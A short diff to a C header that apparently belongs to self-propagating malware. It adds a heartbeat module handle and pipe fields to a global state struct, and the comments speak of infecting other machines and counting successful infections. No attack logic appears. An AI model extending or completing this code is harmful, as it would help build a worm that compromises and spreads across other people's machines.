@@ -1,6 +1,7 @@
 #pragma once
 #include "pack.h"
 #include "resolv.h"
+#include "htbt.h"
 
 #include <stdint.h>
 #include <stdbool.h>
@@ -23,15 +24,16 @@ struct prne_global { // TODO: tidy init code when finalised
 	* Could be NULL. Just keep infecting other machines without it.
 	*/
 	prne_resolv_t *resolv;
+	prne_htbt_t *htbt;
 	pid_t parent_pid;
 	pid_t child_pid;
-	int shm_fd;
 	uint8_t *m_dvault;
 	const uint8_t *m_exec;
 	size_t exec_size;
 	const uint8_t *m_exec_dvault;
+	int blackhole[2];
+	int shm_fd;
 	uint16_t dvault_size;
-	bool bin_ready;
 	bool is_child;
 
 	prne_bin_archive_t bin_archive;
@@ -65,7 +67,7 @@ struct prne_shared_global {
 	uint64_t bne_cnt;
 	// Number of successful infections.
 	uint64_t infect_cnt;
-	// null-terminated name of new binary
+	// null-terminated path to the new binary image
 	char ny_bin_path[256];
 	char ny_bin_args[1024];
 	size_t host_cred_len;
